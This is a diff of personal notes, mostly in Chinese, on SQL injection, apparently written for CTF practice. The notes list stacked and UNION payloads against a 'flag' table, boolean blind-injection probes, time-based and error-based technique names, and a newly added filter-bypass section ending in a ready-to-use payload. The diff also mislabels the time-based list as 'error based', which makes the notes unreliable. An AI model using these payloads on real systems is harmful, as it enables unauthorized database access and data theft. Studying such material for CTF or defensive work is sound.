@@ -151,13 +151,13 @@ mysql> SELECT ORD(MID((IFNULL(CAST(CURRENT_USER() AS CHAR),0x20)),1,1))>64;
 
 		Select *	from a where id = 1; select *	from flag;
 		Select *	from xx where id = 1 union select *	from flag
-		盲注
+盲注
 id=1 and 1=1
 id=1 and 1=2
 id=1 and 1<substring((select flag from flag),1,1)
 O(256^n) -> O(n*log(256))
 
-Time based
+基于错误
 • If else
 • Case . When than else end
 • Sleep
@@ -166,7 +166,7 @@ Time based
 • Wait for delay
 • Wait for time
 
-Error based
+基于错误
 • floor
 • extractvalue
 • updatexml
@@ -179,3 +179,13 @@ Error based
 2.字符型和搜索型注入其变量都有单引号或者双引号、括号括住的，需要先闭合后在跟注入语句。
 
 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除
+
+Bypass
+MID 代替 SUBSTRING
+LIKE 代替 =
+/**/ 代替 空格
+CURRENT_USER 代替 CURRENT_USER()
+" 代替 '
+
+最终例子:
+444/**/OR/**/MID(CURRENT_USER,1,1)/**/LIKE/**/"p"/**/#
